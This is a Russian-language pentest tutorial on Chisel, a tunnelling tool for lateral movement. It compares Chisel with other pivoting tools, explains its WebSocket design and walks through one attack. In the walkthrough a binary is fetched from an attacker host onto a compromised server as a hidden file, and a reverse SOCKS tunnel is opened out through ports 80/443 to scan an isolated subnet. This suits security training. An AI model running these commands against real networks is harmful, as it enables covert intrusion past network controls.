# Chisel: инструмент туннелирования для горизонтального перемещения

## 1. Роль и место Chisel в ландшафте туннелирования при пентесте

**Горизонтальное перемещение** (lateral movement) — совокупность методов, позволяющих злоумышленнику или пентестеру после получения первоначальной точки опоры расширить присутствие внутри сети, переходя от одной скомпрометированной системы к другой. Этот процесс почти всегда упирается в сетевые барьеры: изолированные сегменты, файрволы, запрет входящих соединений из внешней сети, фильтрацию портов на периметре. Ключевым приёмом становятся техники **туннелирования** (Protocol Tunneling, MITRE T1572 [MITRE ATT&CK](https://attack.mitre.org/techniques/T1572)), при которых полезный трафик упаковывается в разрешённый протокол и мультиплексируется через одно управляемое соединение.

Chisel в этом смысле решает прикладную задачу: быстро создать TCP-туннель через HTTP/WebSocket, получив на атакующей машине SOCKS5-прокси или отдельные проброшенные порты внутрь целевой сети. Инструмент спроектирован для сценариев, где использование классических SSH-туннелей затруднено (нет ssh-клиента, интерактивного доступа или сквозного подключения через NAT), а единственно доступный egress-канал ограничен портами 80/443 и HTTP-прокси. При этом Chisel остаётся лёгким: один статически скомпилированный Go-бинарник без зависимостей, который можно перенести на взломанный хост через веб-сервер или SMB.

Следует разграничить Chisel с другими инструментами, применяемыми в том же контексте. Ниже — сравнительная таблица, которая помогает выбрать средство под конкретные ограничения сети.

| Инструмент | Транспорт | Основные режимы | Необходимость отдельного клиента/сервера | Встроенная поддержка SOCKS5 | Прохождение через HTTP-прокси | Типовой сценарий |
|------------|-----------|-----------------|------------------------------------------|-----------------------------|-------------------------------|------------------|
| **Chisel** ([GitHub](https://github.com/jpillora/chisel)) | HTTP + WebSocket (с опциональным TLS) | Reverse port forwarding, SOCKS5 proxy | Один бинарник для обеих ролей | Да | Да, флаг `--proxy` | Быстрый разворот SOCKS-прокси через веб-порты |
| **SSH-туннели** (OpenSSH) | SSH (обычно TCP/22) | Локальный/удалённый проброс портов, динамический forwarding (SOCKS4/5) | Требуется SSH-сервер на точке-ретрансляторе | Да, ключ `-D` | Через `ProxyCommand` или `netcat` | Сети с доступным SSH без жёсткой фильтрации |
| **Ligolo-ng** ([GitHub](https://github.com/nicocha30/ligolo-ng)) | TUN-интерфейс (L3), управляющий канал через TCP/TLS | Маршрутизация целых подсетей (Layer 3) | Да, агент и прокси-сервер | Нет, работает на L3, но через проксификацию можно комбинировать | Требуется настройка маршрутов | Разведка больших сегментов с полным L3-доступом |
| **Socat** | TCP/UDP, может оборачивать в SSL/TLS, HTTP CONNECT | Проброс произвольных сокетов, relay | Требует задания двух endpoint’ов | Нет встроенного SOCKS, нужно комбинировать | Можно через HTTP CONNECT | Гибкая склейка сокетов в произвольных комбинациях |
| **Metasploit pivot (autoroute + socks4a)** | Meterpreter-сессия | SOCKS4a прокси, маршрутизация через Meterpreter | Требует активной Meterpreter-сессии | Да | Ограниченно, только в рамках сессии | Быстрый проброс при наличии Meterpreter |

Chisel выделяется универсальностью в условиях, когда на скомпрометированном хосте нельзя поднять SSH-сервер, а штатные агенты крупных фреймворков отсутствуют. Его HTTP-транспорт имитирует обычный веб-трафик и позволяет обходить даже прокси-серверы с Basic-аутентификацией. В практическах red team часто упоминается как “go-to” инструмент для реверсного SOCKS, когда единственный разрешённый исходящий порт — 80 или 443 [raxis.com](https://raxis.com/blog/lateral-movement-from-beachhead-to-breach).

Таким образом, Chisel — это специализированный туннелировщик, решающий конкретную задачу: организовать обратный SOCKS-канал через HTTP(S) с минимальным footprint’ом и без прав администратора.

## 2. Архитектура и внутреннее устройство Chisel

Chisel построен по классической клиент-серверной модели, но обе роли реализованы в одном исполняемом файле. Сторона, инициирующая управляющий канал, выступает клиентом; сторона, принимающая подключение, — сервером. Типичная топология при пентесте: атакующая машина (Kali Linux) запускает сервер, а скомпрометированный хост в целевой сети — клиент. Однако роли можно менять: в некоторых схемах удобнее развернуть сервер внутри сети, а клиента на атакующей стороне.

**Транспортный уровень** базируется на HTTP Upgrade до WebSocket (RFC 6455). Клиент отправляет HTTP-запрос, содержащий заголовок `Upgrade: websocket`, сервер отвечает `101 Switching Protocols`, после чего соединение переходит в дуплексный режим поверх TCP. Внутри WebSocket-фреймов мультиплексируются отдельные TCP-потоки, соответствующие каждому проброшенному соединению. Иллюстративная схема взаимодействия компонентов:

```text
[ Атакующая машина ]                [ Скомпрометированный хост ]                [ Внутренняя цель ]
 IP: 192.168.0.100                  IP: 192.168.0.10 (внешний)                  IP: 10.10.10.5
                                     IP: 10.10.10.1 (внутренний)
       │                                    │
       │  chisel server -p 8443 --reverse   │
       │◄── HTTP/WebSocket (TCP/8443) ────│
       │                                    │ chisel client 192.168.0.100:8443 R:socks
       │                                    │ (открывает SOCKS на 127.0.0.1:1080 у атакующего)
       │                                    │
       │ SOCKS-запрос через 127.0.0.1:1080 │── TCP-поток в WebSocket ───►│── TCP SYN на 10.10.10.5:80
```

Шифрование тракта обеспечивается двумя механизмами. По умолчанию Chisel использует SSH-подобное рукопожатие для выработки сессионного ключа, которым затем шифруется содержимое WebSocket-фреймов. При этом сам транспорт остаётся HTTP/WebSocket, то есть визуально похож на обычный веб-трафик. Дополнительно можно обернуть всё в TLS, указав серверу ключи `--tls-key` и `--tls-cert`, что повышает скрытность и защищает от пассивного перехвата метаданных.

**Режимы работы** определяются комбинацией флагов и спецификаторов, передаваемых при запуске. Ниже — систематизация основных режимов и их командных сигнатур.

| Режим | Флаги сервера | Спецификатор клиента | Описание |
|-------|---------------|----------------------|----------|
| **Reverse SOCKS proxy** | `--reverse` | `R:socks` | Клиент создаёт SOCKS5-прокси на сервере. На атакующей машине появляется слушающий сокет (по умолчанию 127.0.0.1:1080), трафик с которого проксируется в сеть клиента. |
| **Reverse port forward (одиночный порт)** | `--reverse` | `R:<remote_port>:<local_host>:<local_port>` | Пробрасывает конкретный порт с клиентской машины или доступной ей сети на сервер. Например, `R:2222:10.10.10.5:22` — на сервере откроется порт 2222, ведущий на SSH внутреннего хоста. |
| **Прямой туннель (local forward)** | Без `--reverse` | `<local_host>:<local_port>:<remote_host>:<remote_port>` | Сервер слушает на своём порту и перебрасывает соединение через клиента к удалённой цели. Аналог `ssh -L`. |
| **Прямой SOCKS (с клиента на сервер)** | Без `--reverse` | `socks` | Клиент создаёт SOCKS5-прокси на своей стороне, трафик уходит в сеть сервера. Применяется реже, но полезен для эксфильтрации из изолированного сегмента наружу. |

Внутреннее устройство мультиплексирования: при каждом новом SOCKS-запросе или пробросе порта через управляющий WebSocket создаётся новый логический канал, идентифицируемый уникальным номером. Данные разбиваются на чанки нужного размера и упаковываются в бинарные WebSocket-фреймы. Серверная сторона восстанавливает TCP-потоки и направляет их к целевым сокетам. Такая архитектура позволяет одновременно обслуживать множество соединений (сканирование портов, несколько клиентов HTTP) без открытия дополнительных портов.

**Обработка HTTP-прокси**. Если скомпрометированный хост выходит в интернет через корпоративный `http_proxy`, клиент Chisel поддерживает опцию `--proxy`, которая задаёт URL прокси-сервера, включая данные для Basic-аутентификации. Внутри клиент выполняет HTTP CONNECT, устанавливая туннель к серверу Chisel через прокси. Это делает Chisel особенно ценным в сетях крупных организаций, где прямой доступ наружу отключён.

**Статическая компиляция**. Поскольку инструмент реализован на Go, итоговый бинарник статически скомпонован со всеми зависимостями, не требует libc определённой версии и спокойно запускается на устаревших или минималистичных дистрибутивах Linux, а также на Windows, macOS и FreeBSD. Размер бинарника для Linux/amd64 — около 8 МБ, что вписывается в типичные ограничения при загрузке файлов в процессе эксплуатации [hackers-arise.com](https://hackers-arise.com/pivoting-within-the-network-getting-started-with-chisel).

Все эти конструктивные особенности делают Chisel модульным и предсказуемым компонентом post-exploitation toolkit’а.

## 3. Применение: типовые операции, команды и нюансы работы

**Установка.** В Kali Linux пакет `chisel` доступен в репозитории:

```bash
sudo apt update && sudo apt install chisel
```

Для нестандартных окружений бинарники под нужную архитектуру собираются из исходников:

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build -ldflags="-s -w" .
# кросс-компиляция под Windows:
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o chisel.exe .
```

На хост перемещается итоговый исполняемый файл, часто через предварительно поднятый Python HTTP-сервер:

```bash
# на атакующей машине
python3 -m http.server 8000
# на скомпрометированном хосте
wget http://<attacker_ip>:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

**Запуск сервера для обратного туннеля (наиболее частый кейс).** На атакующей машине сервер явно разрешает reverse-подключения:

```bash
chisel server -p 8443 --reverse -v
```

Флаг `-v` включает подробный вывод, полезный при отладке. Сервер ожидает входящих WebSocket-соединений на порту 8443. При необходимости добавляется `--host 0.0.0.0`, если нужен приём на всех интерфейсах.

**Подключение клиента с формированием SOCKS-прокси.** На скомпрометированной машине:

```bash
./chisel client 192.168.0.100:8443 R:socks
```

После успешного коннекта в выводе появится строка `2023/... [server] Connected`. На атакующей машине автоматически создаётся SOCKS5-прокси на `127.0.0.1:1080` (порт можно переопределить, указав `R:9050:socks`). Теперь любой инструмент, умеющий работать через SOCKS5, может использовать этот туннель для доступа к сегменту, доступному скомпрометированному хосту.

**Проброс конкретного порта (reverse port forwarding).** Если требуется не полный SOCKS, а целевой доступ, например, к внутреннему RDP (TCP 3389), клиент указывает:

```bash
./chisel client 192.168.0.100:8443 R:13389:10.20.30.40:3389
```

На атакующей стороне откроется порт `13389`, направляемый напрямую на внутренний хост `10.20.30.40:3389`.

**Интеграция с proxychains.** После развёртывания SOCKS-прокси через Chisel редактируется файл `/etc/proxychains4.conf` (или `proxychains.conf`):

```bash
[ProxyList]
socks5 127.0.0.1 1080
```

Далее все вызовы оборачиваются командой `proxychains`:

```bash
proxychains nmap -sT -Pn -p 22,80,3306,3389 10.10.10.0/24
```

Nmap будет маршрутизировать TCP SYN-пакеты через цепочку: `nmap -> proxychains -> локальный SOCKS5 (127.0.0.1:1080) -> WebSocket-туннель -> клиент Chisel -> целевая сеть`. Важно использовать TCP-сканирование `-sT`, так как SOCKS-прокси не пробрасывает сырой IP для SYN-сканирования [redfoxsec.com](https://www.redfoxsec.com/blog/tunneling-and-port-forwarding-explained).

**Прохождение через исходящий прокси.** В корпоративных средах с принудительным HTTP-прокси клиента запускают с дополнительным параметром:

```bash
./chisel client 192.168.0.100:8443 R:socks --proxy http://proxy.internal:8080
```

При необходимости указываются учётные данные: `--proxy http://user:pass@proxy.internal:8080`. Клиент выполнит HTTP CONNECT через корпоративный прокси до сервера Chisel, маскируя управляющий трафик под стандартные веб-запросы.

**Выбор TLS-режима.** Для трассировки, исключающей подозрительные открытые тексты HTTP, генерируется самоподписанный сертификат, и сервер запускается с ним:

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem
```

Клиент, в свою очередь, должен доверять этому сертификату (или пропустить проверку, что снижает защиту), либо добавить флаг `--tls-skip-verify`. Но безопаснее использовать публично доверенные сертификаты через Let's Encrypt.

**Типичные ошибки и подводные камни:**

- Забытый `--reverse` на стороне сервера: клиент не сможет зарегистрировать обратный порт, вывод будет содержать ошибку `reverse port forwarding not allowed`.
- Конфликт портов: если SOCKS уже слушает 1080, нужно указать другой порт, например `R:9050:socks`.
- Фильтрация WebSocket: некоторые NGFW инспектируют HTTP и могут блокировать Upgrade до WebSocket, ориентируясь на заголовки. В таких случаях помогает маскировка за HTTPS или смена сигнатур (но Chisel не предлагает глубокой кастомизации HTTP-заголовков; иногда выручает оборачивание в stunnel).
- Отсутствие статического бинарника под специфическую архитектуру: требуется кросс-компиляция с правильными параметрами `GOOS`/`GOARCH`.
- Неверный порядок адресов в спецификаторе `R:<to>:<from>`: для reverse port forward клиент пишет `R:<remote_port>:<local_host>:<local_port>`, где `remote_port` — порт на атакующей стороне, а `local_host` — цель внутри сети клиента. Путаница приводит к отказам соединения.

Использование Chisel в пайплайне пентеста позволяет быстро развернуть надёжный SOCKS-канал без привилегий администратора и лишнего шума, что делает его стандартным звеном между «получить сессию» и «сканировать внутреннюю сеть».

## 4. Сквозной практический пример: развёртывание SOCKS-прокси через Chisel для разведки изолированной подсети

**Исходные условия.** Пентестер в ходе эксплуатации веб-приложения получил от shell-доступ к серверу `web01` (ОС Ubuntu 20.04 LTS), который расположен в DMZ и имеет два сетевых интерфейса: внешний `198.51.100.10` (доступен с Kali машины `192.168.119.5`) и внутренний `10.10.10.2`. Согласно документации, внутренняя сеть `10.10.10.0/24` содержит сервер баз данных и дополнительное веб-приложение, недоступные снаружи. Наружу с `web01` разрешён только исходящий трафик на порты 80 и 443. На атакующей машине Kali Linux установлен Chisel версии 1.9.1.

**Шаг 1. Запуск Chisel-сервера на Kali.** Для приёма обратного туннеля на атакующей стороне поднимаем сервер на порту 443 (имитация HTTPS):

```bash
chisel server -p 443 --reverse -v
```

*Ожидаемый вывод:*
```
2025/01/10 12:00:01 server: Fingerprint: ... 
2025/01/10 12:00:01 server: Listening on http://0.0.0.0:443
```
Сервер готов принимать обратные соединения.

**Шаг 2. Доставка статического бинарника на web01.** На Kali предварительно скачан статический бинарник `chisel_1.9.1_linux_amd64`. Запускаем временный HTTP-сервер для передачи файла:

```bash
python3 -m http.server 8000
```

На `web01` выполняем загрузку:

```bash
wget http://192.168.119.5:8000/chisel_1.9.1_linux_amd64 -O /tmp/.chisel
chmod +x /tmp/.chisel
```

*Ожидаемый вывод wget:* `2025-01-10 12:02:03 (1.2 MB/s) - '/tmp/.chisel' saved [8123456/8123456]`.

**Шаг 3. Подключение клиента и создание reverse SOCKS.** Теперь на `web01` инициируем соединение с сервером:

```bash
/tmp/.chisel client 192.168.119.5:443 R:socks &
```

*Ожидаемый вывод клиента:*
```
2025/01/10 12:03:01 client: Connected (SOCKS reverse)
```

На Kali в логах сервера появится запись о подключении. Локально на Kali теперь слушается порт 1080:

```bash
ss -tlnp | grep 1080
```

*Ожидаемый результат:* `LISTEN 0 128 127.0.0.1:1080 ... chisel`.

**Шаг 4. Настройка proxychains и разведка внутренней сети.** В файл `/etc/proxychains4.conf` добавим строку:

```bash
socks5 127.0.0.1 1080
```

Теперь выполняем сканирование подсети `10.10.10.0/24` через туннель:

```bash
proxychains nmap -sT -Pn -p 22,80,3306,3389 10.10.10.0/24
```

Типичный фрагмент результата:

```
Nmap scan report for 10.10.10.5
Host is up (0.20s latency).
PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp open   mysql

Nmap scan report for 10.10.10.10
Host is up (0.22s latency).
PORT     STATE  SERVICE
80/tcp   open   http
```

*Интерпретация:* обнаружен хост `10.10.10.5` с СУБД MySQL и SSH, а также внутренний веб-сервер `10.10.10.10`, ранее недоступные напрямую.

**Шаг 5. Доступ к внутреннему веб-приложению.** Используем proxychains для обращения к веб-серверу:

```bash
proxychains curl -I http://10.10.10.10/
```

*Ожидаемый ответ:*
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html
```
Соединение успешно прошло через туннель, и пентестер получил возможность взаимодействовать с внутренним приложением (дальнейшая эксплуатация, сбор данных и т.д.).

Таким образом, Chisel позволил за несколько минут развернуть обратный SOCKS-прокси через стандартный веб-канал, скрытно обойти сетевые ограничения DMZ и провести разведку изолированного сегмента. Этот сценарий тиражируется на любые среды, где требуется быстрое горизонтальное перемещение без развёртывания тяжёлых агентов.
